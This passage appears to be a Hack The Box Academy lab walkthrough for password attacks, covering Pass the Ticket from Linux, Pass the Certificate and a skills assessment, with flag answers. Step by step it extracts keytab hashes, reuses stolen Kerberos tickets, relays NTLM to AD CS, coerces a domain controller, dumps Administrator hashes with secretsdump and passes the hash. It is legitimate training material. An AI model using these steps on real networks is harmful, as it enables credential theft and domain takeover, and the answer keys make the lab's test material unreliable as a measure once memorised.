# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 

# m h  dom mon dow   command

*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

The crontab reveals the location of a `/.scripts` directory. Therefore, students need to navigate to it and view its contents:

Code: shell

```shell
cd /home/carlos@inlanefreight.htb/.scripts/
/.scripts$ ls -la
```

```shell-session
carlos@inlanefreight.htb@linux01:~$ cd /home/carlos@inlanefreight.htb/.scripts/
carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la

total 24
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 31 15:05 .
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12 21:19 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6 14:20 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6 12:30 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Oct 31 15:05 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct 31 15:05 svc_workstations.kt
```

Subsequently, students need to extract hashes from `svc_workstations._all.kt`:

Code: shell

```shell
python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```

```shell-session
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677
```

Then, students need to use https://crackstation.net to decrypt the NTLM hash `7247e8d4387e76996ff3f18a34316fdd`:

The hash is revealed to be `Password4`, therefore, students can now connect with SSH to the spawned target machine using the credentials `svc_workstations@inlanefreight.htb`:

Code: shell

```shell
ssh svc_workstations@inlanefreight.htb@STMIP -p 2222
```

```shell-session
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-bmdznxzunh]─[~]
└──╼ [★]$ ssh svc_workstations@inlanefreight.htb@10.129.129.132 -p 2222
svc_workstations@inlanefreight.htb@10.129.129.132's password: 

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

svc_workstations@inlanefreight.htb@linux01:~$ 
```

At last, students can now read the flag file "flag.txt" located in the directory `/home/svc_workstations@inlanefreight.htb/`:

Code: shell

```shell
cat /home/svc_workstations@inlanefreight.htb/flag.txt
```

```shell-session
svc_workstations@inlanefreight.htb@linux01:~$ cat /home/svc_workstations@inlanefreight.htb/flag.txt 

{hidden} actions
```

Answer: `Mor3_4cce$$_m0r3_Pr1v$`

# Pass the Ticket (PtT) from Linux

## Question 6

### "Check svc_workstation's sudo privileges and get access as root. Submit the flag in /root/flag.txt directory as the response."

Using the previously established SSH session as `svc_workstations`, students need to check the sudo permissions of `svc_workstations`:

Code: shell

```shell
sudo -l
```

```shell-session
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l

[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

Students will see that they can run any binary as sudo, thus, they can easily escalate privileges to root:

Code: shell

```shell
sudo su
```

```shell-session
svc_workstations@inlanefreight.htb@linux01:~$ sudo su

root@linux01:/home/svc_workstations@inlanefreight.htb# 
```

At last, students need to read the flag file "flag.txt" located at `/root/`:

Code: shell

```shell
cat /root/flag.txt 
```

```shell-session
root@linux01:/home/svc_workstations@inlanefreight.htb# cat /root/flag.txt 

{hidden}
```

Answer: `Ro0t_Pwn_K3yT4b`

# Pass the Ticket (PtT) from Linux

## Question 7

### "Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the content of julio.txt from the domain share folder \\DC01\julio."

Using the previously established and privileged SSH session, students need to look for all files in `/tmp` and identify the file that starts with `kerb5cc` whose owner is `julio@inlanefreight.htb`:

Code: shell

```shell
ls -la /tmp | grep krb5
```

```shell-session
root@linux01:~# ls -la /tmp | grep krb5

-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Oct 31 15:45 krb5cc_647401106_9JBodG
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct 31 15:45 krb5cc_647401106_HRJDux
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct 31 15:41 krb5cc_647401109_JKXJ8V
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Oct 31 15:45 krb5cc_647402606
```

Students need to copy the non expired ticket to the working directory and set the environment variable accordingly:

Code: shell

```shell
cp /tmp/krb5cc_647401106_9JBodG .
export KRB5CCNAME=/root/krb5cc_647401106_9JBodG
```

```shell-session
root@linux01:~# cp /tmp/krb5cc_647401106_9JBodG .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_9JBodG
```

Subsequently, students need to connect with SMB and read the flag on the shared folder:

Code: shell

```shell
smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
cat julio.txt
```

```shell-session
root@linux01:~# smbclient //dc01/julio -k -c 'get julio.txt' -no-pass

getting file \julio.txt of size 17 as julio.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)

root@linux01:~# cat julio.txt 

{hidden}
```

Answer: `JuL1()_SH@re_fl@g`

# Pass the Ticket (PtT) from Linux

## Question 8

### "Use the LINUX01$ Kerberos ticket to read the flag from \\DC01\linux01. Submit the content as a response."

Using the previously established SSH session, students need to make a new directory for the final flag and then navigate to it:

Code: shell

```shell
mkdir final_flag
cd final_flag/
```

```shell-session
root@linux01:~# mkdir final_flag
root@linux01:~# cd final_flag/
```

Students then need to use the Kerberos ticket for the machine account located at `/etc/krb5.keytab`:

Code: shell

```shell
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

```shell-session
root@linux01:~/final_flag# kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

At last, students need to access the shared folder `//dc01/linux01` to retrieve the flag from "flag.txt":

Code: shell

```shell
smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
cat flag.txt
```

```shell-session
root@linux01:~/final_flag# smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass

getting file \flag.txt of size 52 as flag.txt (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)
root@linux01:~/final_flag# cat flag.txt

{hidden}
```

Answer: `Us1nG_KeyTab_Like_@_PRO`

# Pass the Certificate

## Question 1

### “What are the contents of flag.txt on jpinkman's desktop?"

Students will start by using `git clone` on the [pywhisker](https://github.com/ShutdownRepo/pywhisker.git) repository:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker

Cloning into 'pywhisker'...
remote: Enumerating objects: 235, done.
remote: Counting objects: 100% (106/106), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 235 (delta 75), reused 75 (delta 66), pack-reused 129 (from 1)
Receiving objects: 100% (235/235), 2.10 MiB | 41.29 MiB/s, done.
Resolving deltas: 100% (115/115), done.
```

Students will then use `pywhisker.py` to generate a `.pfx` certificate for user `jpinkman`:

Code: shell

```shell
python3 pywhisker.py --dc-ip STMIP -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/pywhisker/pywhisker]
└──╼ [★]$ python3 pywhisker.py --dc-ip 10.129.156.68 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5c502756-52ee-7cd1-3fcf-16b508bde82e
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 1UCYb0YS.pfx
[+] PFX exportiert nach: 1UCYb0YS.pfx
[i] Passwort für PFX: 1P9EvC2tKKJlBSum4Ej4
[+] Saved PFX (#PKCS12) certificate & key at path: 1UCYb0YS.pfx
[*] Must be used with password: 1P9EvC2tKKJlBSum4Ej4
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Students will then `git clone` the `PKINITtools` repository, use a python virtual environment and install the requirements.

Code: shell

```shell
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools

Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 14.04 MiB/s, done.
Resolving deltas: 100% (21/21), done.

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 -m venv .venv

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ source .venv/bin/activate

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt

Collecting impacket
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 48.6 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
  
<SNIP>
```

Now students need to use the `gettgtpkinit.py` to generate a `TGT` file using the `.pfx` file with the pfx password generated by `pywhisker` alongside the `DC` IP address. But first students need to fix `"Error detecting the version of libcrypto"`, by fixing a package using:

Code: shell

```shell
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

Code: shell

```shell
python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx -pfx-pass '1P9EvC2tKKJlBSum4Ej4' -dc-ip STMIP INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx -pfx-pass '1P9EvC2tKKJlBSum4Ej4' -dc-ip 10.129.156.68 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-06-11 04:55:30,320 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-11 04:55:30,348 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-11 04:55:53,350 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-11 04:55:53,350 minikerberos INFO     bf43d22231614ddf13f1a5bcc40fad1c98ea8fc6edee8b4cc969dde847c1d890
INFO:minikerberos:bf43d22231614ddf13f1a5bcc40fad1c98ea8fc6edee8b4cc969dde847c1d890
2025-06-11 04:55:53,356 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Students need to install the `krb5-user` package:

Code: shell

```shell
sudo apt-get install krb5-user -y
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo apt-get install krb5-user -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Launchers are updated
```

Once this is done, students need to update and setup the `krb5.conf` file located at `/etc/krb5.conf` to point to the `INLANEFREIGHT.LOCAL` domain and KDC as such:

Code: shell

```shell
sudo nano /etc/krb5.conf
```

![Password_Attacks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_30.png)

Students will also add the `dc01.inlanefreight.local` to the `/etc/hosts` file:

Code: shell

```shell
echo "SMTIP   dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ echo "10.129.156.68   dc01.inlanefreight.local" | sudo tee -a /etc/hosts

10.129.156.68   dc01.inlanefreight.local
```

Students will then export the value `/tmp/jpinkman.ccache` to the `KRB5CCNAME` environment variable and by running the `klist` command, students will now see the ticket cache file for `jpinkman`.

Code: shell

```shell
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.15.117]─[htb-ac-569447@htb-qsycfzvxwh]─[~/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/jpinkman.ccache

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/11/2025 04:55:29  06/11/2025 14:55:29  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Students will now use the ticket alongside `evil-winrm` to obtain a shell:

Code: shell

```shell
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents>
```

Students will then use the `type` command to read the flag located at `C:\Users\jpinkman\Desktop\flag.txt`

Code: shell

```shell
type C:\Users\jpinkman\Desktop\flag.txt
```

```shell-session
*Evil-WinRM* PS C:\Users\jpinkman\Documents> type C:\Users\jpinkman\Desktop\flag.txt

{hidden}
```

Answer: `3d7e3dfb56b200ef715cfc300f07f3f8`

# Pass the Certificate

## Question 2

### “What are the contents of flag.txt on Administrator's desktop?"

Students will start by using Impacket’s `ntlmrelayx` to listen for inbound connections and relay them to the web enrollment service (ACADEMY-PWATTCK-PTCCA01) using the following command:

Code: shell

```shell
sudo impacket-ntlmrelayx -t http://STMIP/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo impacket-ntlmrelayx -t http://10.129.19.224/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
Exception in thread Thread-2:
Traceback (most recent call last):
  File "/usr/lib/python3.11/threading.py", line 1038, in _bootstrap_inner
    self.run()
  File "/usr/local/lib/python3.11/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 560, in run
    self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 47, in __init__
    socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
  File "/usr/lib/python3.11/socketserver.py", line 456, in __init__
    self.server_bind()
  File "/usr/lib/python3.11/socketserver.py", line 472, in server_bind
    self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Students then need to download and use `printerbug.py` to coerce the `DC` (ACADEMY-PWATTCK-PTCDC01) to attempt authentication against the attacker host:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
```

Students will perform coercion using `printerbug.py` with the credentials `wwhite:package5shores_topher1`:

Code: shell

```shell
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@STMIP PWNIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.156.68 10.10.14.209
[*] Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.156.68
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

At the same time `ntlmrelayx` listener will receive a connection and generate the `.pfx` certificate file.

```shell-session
<SNIP>

[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.156.68, attacking target http://10.129.19.224
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.129.19.224 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.156.68, attacking target http://10.129.19.224
[-] Authenticating against http://10.129.19.224 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 13
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

Students will then `git clone` the `PKINITtools` repository, use a python virtual environment and install the requirements.

Code: shell

```shell
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools

Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 14.04 MiB/s, done.
Resolving deltas: 100% (21/21), done.

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 -m venv .venv

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ source .venv/bin/activate

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt

Collecting impacket
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 48.6 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
  
<SNIP>
```

Now students need to use the `gettgtpkinit.py` to generate a `TGT` file using the `.pfx` file with the password generated by `pywhisker` alongside the `DC` IP address. But first students will fix the `"Error detecting the version of libcrypto"` error by installing the `oscrypto` module:

Code: shell

```shell
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

Students will proceed to generate a Ticket Granting Ticket using `gettgtpkinit.py` and the previously obtained `DC01.pfx` file and save the ticket as `/tmp/dc.ccache`:

Code: shell

```shell
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip STMIP 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.156.68 'inlanefreight.local/dc01$' /tmp/dc.ccache

2025-06-11 05:39:53,556 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-11 05:39:53,857 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-11 05:40:05,956 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-11 05:40:05,956 minikerberos INFO     f89e3fb8763565a71f639825f36826dae6540264994f22e67d699b27712cbe6a
INFO:minikerberos:f89e3fb8763565a71f639825f36826dae6540264994f22e67d699b27712cbe6a
2025-06-11 05:40:05,962 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Students need to export the generated TGT file path as an environment variable with the name `KRB5CCNAME`:

Code: shell

```shell
export KRB5CCNAME=/tmp/dc.ccache
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/dc.ccache
```

Students will also need to install the `krb5-user` package:

Code: shell

```shell
sudo apt-get install krb5-user -y
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo apt-get install krb5-user -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Launchers are updated
```

Once this is done, students need to setup the `krb5.conf` file located at `/etc/krb5.conf` to configure the realm and the KDC as seen below:

Code: shell

```shell
sudo nano /etc/krb5.conf
```

![Password_Attacks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_31.png)

Students will also add the `dc01.inlanefreight.local` to the `/etc/hosts` file:

Code: shell

```shell
echo "STMIP   dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ echo "10.129.156.68   dc01.inlanefreight.local" | sudo tee -a /etc/hosts

10.129.156.68   dc01.inlanefreight.local
```

By running the `klist` command, students will now see the ticket cache file for `dc01$`.

Code: shell

```shell
klist
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-horirkufg2]─[~]
└──╼ [★]$ klist
Ticket cache: FILE:/tmp/dc.ccache
Default principal: dc01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/11/2025 06:01:51  06/11/2025 16:01:51  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Using Impacket's `secretsdump` with the `-k` option for Kerberos authentication along with the `-no-pass` option to not prompt for a password, followed by the `DC` IP address:

Code: shell

```shell
impacket-secretsdump -k -no-pass -dc-ip STMIP -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.156.68 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
Administrator:des-cbc-md5:a1f262b50b64c46b
[*] Cleaning up...
```

Students will then use the Administrator's hash to perform a pass the hash attack using `evil-winrm` as follows:

Code: shell

```shell
evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Subsequently, students will obtain the flag by querying the contents of `flag.txt` located in the `C:\Users\Administrator\Desktop` directory:

Code: shell

```shell
type C:\Users\Administrator\Desktop\flag.txt
```

```shell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt

{hidden}
```

Answer: `a1fc497a8433f5a1b4c18274019a2cdb`

# Skills Assessment - Password Attacks

## Question 1

### “What is the NTLM hash of NEXURA\Administrator?"

After spawning the skill assessment targets, students are provided with a single IP address for initial access. Students will start by using `nmap` to check what ports are open.

Code: shell

```shell
nmap STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ nmap 10.129.234.116

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 08:41 CDT
Nmap scan report for 10.129.234.116
Host is up (0.0036s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Only `SSH` is open on the default port 22.

Students are also provided with a potential password (`Texas123!@#`) and a name (`Betty Jayde`), but no username. Since this is the case, students will need to make use of the `username-anarchy` tool to generate potential usernames.

Code: shell

```shell
git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy

Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 448 (delta 29), reused 32 (delta 9), pack-reused 386 (from 1)
Receiving objects: 100% (448/448), 16.79 MiB | 36.34 MiB/s, done.
Resolving deltas: 100% (156/156), done.
```

Code: shell

```shell
./username-anarchy Betty Jayde > user.list
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~/username-anarchy]
└──╼ [★]$ ./username-anarchy Betty Jayde > user.list
```

